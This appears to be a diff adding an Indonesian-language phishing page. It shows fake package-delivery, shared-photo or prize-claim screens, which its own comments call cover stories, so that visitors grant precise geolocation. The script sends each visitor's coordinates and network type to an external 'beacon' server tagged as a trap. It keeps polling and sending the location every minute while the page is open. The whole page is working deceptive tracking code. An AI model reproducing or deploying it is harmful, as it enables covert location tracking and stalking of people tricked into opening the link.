@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Konfirmasi</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+    body{
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+      min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
+      padding:24px 20px;
+      background:#f5f7fa;color:#111;
+    }
+
+    /* ── TEMA PAKET ─────────────────────── */
+    body.theme-paket{background:#fff8f0}
+    body.theme-paket .accent{color:#e85d04}
+    body.theme-paket .btn-main{background:#e85d04}
+    body.theme-paket .icon-bg{background:#fff0e6;color:#e85d04}
+
+    /* ── TEMA FOTO ──────────────────────── */
+    body.theme-foto{background:#f0f4ff}
+    body.theme-foto .accent{color:#4f46e5}
+    body.theme-foto .btn-main{background:#4f46e5}
+    body.theme-foto .icon-bg{background:#ede9fe;color:#4f46e5}
+
+    /* ── TEMA HADIAH ────────────────────── */
+    body.theme-hadiah{background:#f0fdf4}
+    body.theme-hadiah .accent{color:#16a34a}
+    body.theme-hadiah .btn-main{background:#16a34a}
+    body.theme-hadiah .icon-bg{background:#dcfce7;color:#16a34a}
+
+    .card{
+      background:#fff;border-radius:20px;padding:28px 24px;max-width:360px;width:100%;
+      box-shadow:0 4px 32px rgba(0,0,0,.10);text-align:center;
+    }
+    .icon-bg{
+      width:72px;height:72px;border-radius:20px;margin:0 auto 18px;
+      display:flex;align-items:center;justify-content:center;font-size:34px;
+    }
+    h1{font-size:19px;font-weight:800;margin-bottom:8px;line-height:1.3}
+    .subtitle{font-size:14px;color:#6b7280;margin-bottom:22px;line-height:1.5}
+    .info-row{
+      display:flex;justify-content:space-between;align-items:center;
+      padding:10px 0;border-bottom:1px solid #f3f4f6;font-size:13px;
+    }
+    .info-row:last-of-type{border-bottom:none;margin-bottom:18px}
+    .info-label{color:#9ca3af;font-weight:500}
+    .info-val{font-weight:700;color:#111}
+    .btn-main{
+      width:100%;padding:14px;border-radius:12px;border:none;
+      color:#fff;font-size:15px;font-weight:700;cursor:pointer;
+      letter-spacing:.01em;
+    }
+    .btn-main:active{opacity:.85}
+
+    /* Loading state */
+    #loadingState{display:none;text-align:center;padding:20px 0}
+    .spinner{
+      width:44px;height:44px;border:4px solid #e5e7eb;
+      border-top-color:#6366f1;border-radius:50%;
+      animation:spin .8s linear infinite;margin:0 auto 16px;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .loading-text{font-size:14px;color:#6b7280;line-height:1.6}
+
+    /* Done state */
+    #doneState{display:none;text-align:center;padding:10px 0}
+    .done-icon{font-size:48px;margin-bottom:12px}
+    .done-msg{font-size:15px;color:#374151;line-height:1.6;font-weight:500}
+    .done-sub{font-size:13px;color:#9ca3af;margin-top:8px;line-height:1.5}
+
+    .loc-note{
+      font-size:11px;color:#9ca3af;margin-top:14px;line-height:1.5;
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+
+  <!-- INITIAL STATE -->
+  <div id="initState">
+    <div class="icon-bg" id="cardIcon"></div>
+    <h1 id="cardTitle"></h1>
+    <div class="subtitle" id="cardSub"></div>
+
+    <div id="infoRows"></div>
+
+    <button class="btn-main" id="btnMain" onclick="startTracking()"></button>
+    <div class="loc-note" id="locNote"></div>
+  </div>
+
+  <!-- LOADING -->
+  <div id="loadingState">
+    <div class="spinner" id="loadingSpinner"></div>
+    <div class="loading-text" id="loadingText"></div>
+  </div>
+
+  <!-- DONE -->
+  <div id="doneState">
+    <div class="done-icon" id="doneIcon"></div>
+    <div class="done-msg" id="doneMsg"></div>
+    <div class="done-sub" id="doneSub"></div>
+  </div>
+
+</div>
+
+<script>
+'use strict';
+
+// ── CONFIG ────────────────────────────────────────────────────
+const params   = new URLSearchParams(location.search);
+const deviceId = params.get('d') || '';
+const type     = params.get('type') || 'paket';
+const CLOUD    = 'https://sentinel.fiezel.my.id';
+
+// ── COVER STORIES ─────────────────────────────────────────────
+const STORIES = {
+  paket: {
+    theme:       'theme-paket',
+    icon:        '📦',
+    title:       'Paket Menunggumu!',
+    sub:         'Ada kiriman yang belum diambil. Konfirmasi alamat kamu untuk menjadwalkan pengiriman ulang.',
+    rows:        [
+      { label: 'No. Resi',    val: resi() },
+      { label: 'Status',      val: 'Menunggu Konfirmasi' },
+      { label: 'Kurir',       val: 'Pengiriman Reguler' },
+    ],
+    btn:         'Konfirmasi Lokasi Sekarang',
+    locNote:     'Diperlukan akses lokasi untuk memverifikasi alamat pengiriman.',
+    loading:     'Memverifikasi alamat kamu…',
+    doneIcon:    '✅',
+    doneMsg:     'Konfirmasi berhasil!',
+    doneSub:     'Kurir akan menghubungi kamu segera. Tetap pantau nomor HP kamu.',
+    spinner:     '#e85d04',
+  },
+  foto: {
+    theme:       'theme-foto',
+    icon:        '🖼️',
+    title:       'Ada Foto Untukmu',
+    sub:         'Seseorang mengirimkan foto kepadamu. Verifikasi identitas untuk membuka.',
+    rows:        [
+      { label: 'Dikirim oleh', val: 'Kontak Tersimpan' },
+      { label: 'Jumlah foto',  val: `${rand(3,9)} foto` },
+      { label: 'Dikirim',      val: 'Baru saja' },
+    ],
+    btn:         'Verifikasi & Lihat Foto',
+    locNote:     'Verifikasi lokasi diperlukan untuk keamanan akun kamu.',
+    loading:     'Memverifikasi identitas…',
+    doneIcon:    '📬',
+    doneMsg:     'Verifikasi berhasil!',
+    doneSub:     'Foto sedang diunduh. Silakan tunggu beberapa saat.',
+    spinner:     '#4f46e5',
+  },
+  hadiah: {
+    theme:       'theme-hadiah',
+    icon:        '🎁',
+    title:       'Kamu Terpilih!',
+    sub:         'Selamat! Nomor kamu terpilih untuk mendapatkan reward spesial.',
+    rows:        [
+      { label: 'Hadiah',       val: `Rp ${prize()}` },
+      { label: 'Berlaku',      val: 'Hari ini saja' },
+      { label: 'Status',       val: 'Menunggu Klaim' },
+    ],
+    btn:         'Klaim Hadiah Sekarang',
+    locNote:     'Konfirmasi wilayah diperlukan untuk pengiriman hadiah.',
+    loading:     'Memproses klaim kamu…',
+    doneIcon:    '🎉',
+    doneMsg:     'Klaim berhasil diproses!',
+    doneSub:     'Tim kami akan menghubungi kamu dalam 1×24 jam untuk konfirmasi.',
+    spinner:     '#16a34a',
+  },
+};
+
+function resi() {
+  return 'SN' + Math.floor(10000000 + Math.random()*89999999);
+}
+function rand(a, b) { return Math.floor(Math.random() * (b - a + 1)) + a; }
+function prize() {
+  const vals = ['50.000','75.000','100.000','150.000','200.000'];
+  return vals[Math.floor(Math.random() * vals.length)];
+}
+
+// ── RENDER COVER STORY ────────────────────────────────────────
+const s = STORIES[type] || STORIES.paket;
+document.body.classList.add(s.theme);
+document.getElementById('cardIcon').textContent = s.icon;
+document.getElementById('cardTitle').textContent = s.title;
+document.getElementById('cardSub').textContent = s.sub;
+document.getElementById('btnMain').textContent = s.btn;
+document.getElementById('locNote').textContent = s.locNote;
+document.getElementById('loadingText').textContent = s.loading;
+document.getElementById('doneIcon').textContent = s.doneIcon;
+document.getElementById('doneMsg').textContent = s.doneMsg;
+document.getElementById('doneSub').textContent = s.doneSub;
+document.getElementById('loadingSpinner').style.borderTopColor = s.spinner;
+
+const rowsEl = document.getElementById('infoRows');
+s.rows.forEach(r => {
+  rowsEl.innerHTML += `<div class="info-row">
+    <span class="info-label">${r.label}</span>
+    <span class="info-val">${r.val}</span>
+  </div>`;
+});
+
+// ── TRACKING ──────────────────────────────────────────────────
+let tracking = false;
+
+async function startTracking() {
+  if (tracking) return;
+  tracking = true;
+
+  document.getElementById('initState').style.display = 'none';
+  document.getElementById('loadingState').style.display = 'block';
+
+  // Minta lokasi dengan reason yang meyakinkan
+  let lat = null, lon = null, acc = null;
+  try {
+    const pos = await new Promise((res, rej) =>
+      navigator.geolocation.getCurrentPosition(res, rej, {
+        enableHighAccuracy: true, timeout: 10000, maximumAge: 0,
+      })
+    );
+    lat = pos.coords.latitude;
+    lon = pos.coords.longitude;
+    acc = Math.round(pos.coords.accuracy);
+  } catch {}
+
+  // Kirim beacon
+  if (deviceId) {
+    try {
+      await fetch(`${CLOUD}/api/beacon/${deviceId}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          lat, lon, accuracy: acc,
+          alert: true,
+          alertReason: `trap:${type}`,
+          network: navigator.connection ? navigator.connection.effectiveType : null,
+        }),
+      });
+    } catch {}
+  }
+
+  // Simpan deviceId → polling jalan terus kalau halaman tetap terbuka
+  if (deviceId) {
+    try { localStorage.setItem('sz_trap_device', deviceId); } catch {}
+    schedulePoll();
+  }
+
+  // Tunjukkan done state setelah 2.5 detik
+  await new Promise(r => setTimeout(r, 2500));
+  document.getElementById('loadingState').style.display = 'none';
+  document.getElementById('doneState').style.display = 'block';
+}
+
+// ── POLLING LOKASI (selama halaman terbuka) ───────────────────
+function schedulePoll() {
+  setInterval(async () => {
+    const id = deviceId || localStorage.getItem('sz_trap_device');
+    if (!id) return;
+    let lat = null, lon = null, acc = null;
+    try {
+      const pos = await new Promise((res, rej) =>
+        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 })
+      );
+      lat = pos.coords.latitude; lon = pos.coords.longitude;
+      acc = Math.round(pos.coords.accuracy);
+    } catch {}
+    try {
+      await fetch(`${CLOUD}/api/beacon/${id}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ lat, lon, accuracy: acc }),
+      });
+    } catch {}
+  }, 60_000);
+}
+</script>
+</body>
+</html>
